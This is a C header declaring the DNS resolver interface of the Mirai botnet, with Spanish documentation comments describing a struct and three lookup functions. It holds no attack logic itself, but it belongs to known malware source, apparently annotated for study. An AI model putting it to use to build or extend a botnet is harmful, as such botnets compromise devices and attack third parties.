/**
 * @file resolv.h
 * @brief Interfaz del resolvedor DNS para el bot Mirai
 *
 * Este archivo de encabezado define las estructuras y prototipos de funciones
 * necesarias para realizar resolución de nombres de dominio a direcciones IP.
 * Proporciona una interfaz simple para realizar consultas DNS y manejar los
 * resultados.
 */

#pragma once

#include "includes.h"

/**
 * @brief Estructura que almacena los resultados de una consulta DNS
 *
 * Esta estructura mantiene una lista de direcciones IPv4 obtenidas
 * al resolver un nombre de dominio. Contiene tanto las direcciones
 * como la cantidad de ellas.
 */
struct resolv_entries {
    uint8_t addrs_len;    /**< Número de direcciones IP encontradas */
    ipv4_t *addrs;        /**< Array dinámico de direcciones IPv4 */
};

/**
 * @brief Convierte un nombre de dominio al formato de etiquetas DNS
 *
 * @param dst_hostname Buffer donde se almacenará el nombre convertido
 * @param src_domain Nombre de dominio a convertir (ejemplo: "dominio.com")
 */
void resolv_domain_to_hostname(char *dst_hostname, char *src_domain);

/**
 * @brief Resuelve un nombre de dominio a direcciones IPv4
 *
 * Realiza una consulta DNS tipo A para obtener las direcciones IPv4
 * asociadas al dominio especificado. Utiliza el servidor DNS de Google (8.8.8.8)
 * y realiza hasta 5 intentos de consulta.
 *
 * @param domain Nombre de dominio a resolver
 * @return Puntero a estructura resolv_entries con las IPs encontradas, o NULL si falla
 */
struct resolv_entries *resolv_lookup(char *domain);

/**
 * @brief Libera la memoria de una estructura resolv_entries
 *
 * @param entries Puntero a la estructura resolv_entries a liberar
 */
void resolv_entries_free(struct resolv_entries *entries);
